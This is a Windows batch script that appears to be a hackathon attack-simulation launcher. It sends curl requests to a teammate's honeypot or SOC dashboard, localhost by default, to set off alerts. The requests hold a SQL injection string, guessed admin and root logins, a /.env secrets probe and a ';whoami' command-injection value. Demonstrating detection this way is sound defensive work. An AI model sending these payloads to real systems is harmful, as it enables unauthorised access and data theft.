@echo off
title GhostTrap Attacker Simulation Launcher
color 0C
echo ========================================================
echo   GHOSTTRAP LIVE ATTACK SIMULATOR (LAPTOP 2 TOOL)
echo   Team Chai ^& Commits - Hackathon Attack Console
echo ========================================================
echo.
set /p TARGET_IP="Enter Laptop 1 IP Address (Press ENTER for localhost): "
if "%TARGET_IP%"=="" set TARGET_IP=127.0.0.1

:MENU
echo.
echo Select Attack Payload to Launch:
echo  [1] SQL Injection Attack on User Database (/api/v1/users)
echo  [2] Credential Brute Force on Admin SSO (/api/v1/auth/login)
echo  [3] Exfiltrate Canary AWS Secret Key (/canary/CNRY-8821)
echo  [4] Sensitive Directory Traversal (/.env probe)
echo  [5] Remote Command Execution Probe (/api/ping)
echo  [6] Launch Full Automated Attack Wave (All 5 sequentially)
echo  [7] Exit
echo.
set /p CHOICE="Enter choice [1-7]: "

if "%CHOICE%"=="1" (
    echo [*] Launching SQL Injection...
    curl -s "http://%TARGET_IP%:3000/api/v1/users?search='%%20OR%%20'1'='1"
    echo.
    echo [+] Attack delivered. Check Laptop 1 SOC Screen!
    goto MENU
)

if "%CHOICE%"=="2" (
    echo [*] Launching Admin Credential Brute Force...
    curl -s -X POST -H "Content-Type: application/json" -d "{\"username\":\"admin\",\"password\":\"supersecret123\"}" "http://%TARGET_IP%:3000/api/v1/auth/login"
    echo.
    echo [+] Attack delivered. Check Laptop 1 SOC Screen!
    goto MENU
)

if "%CHOICE%"=="3" (
    echo [*] Tripping Canary Exfiltration Token...
    curl -s "http://%TARGET_IP%:3000/canary/CNRY-8821-EXFILTRATION-ALERT"
    echo.
    echo [+] Canary Tripwire tripped! Red Siren should sound on Laptop 1!
    goto MENU
)

if "%CHOICE%"=="4" (
    echo [*] Probing Sensitive Route /.env...
    curl -s "http://%TARGET_IP%:3000/.env"
    echo.
    echo [+] Path Traversal triggered! Check Laptop 1 SOC Screen!
    goto MENU
)

if "%CHOICE%"=="5" (
    echo [*] Injecting Command Payload...
    curl -s "http://%TARGET_IP%:3000/api/system/ping?host=127.0.0.1;whoami"
    echo.
    echo [+] RCE probe delivered!
    goto MENU
)

if "%CHOICE%"=="6" (
    echo [*] LAUNCHING MULTI-VECTOR ATTACK WAVE...
    curl -s "http://%TARGET_IP%:3000/api/v1/users?search='%%20OR%%20'1'='1" > nul
    timeout /t 1 > nul
    curl -s -X POST -H "Content-Type: application/json" -d "{\"username\":\"root\",\"password\":\"toor\"}" "http://%TARGET_IP%:3000/api/v1/auth/login" > nul
    timeout /t 1 > nul
    curl -s "http://%TARGET_IP%:3000/.env" > nul
    timeout /t 1 > nul
    curl -s "http://%TARGET_IP%:3000/canary/CNRY-8821-EXFILTRATION-ALERT" > nul
    echo [+] All 4 attacks delivered! Laptop 1 should show Critical Threat Level!
    goto MENU
)

if "%CHOICE%"=="7" exit
goto MENU
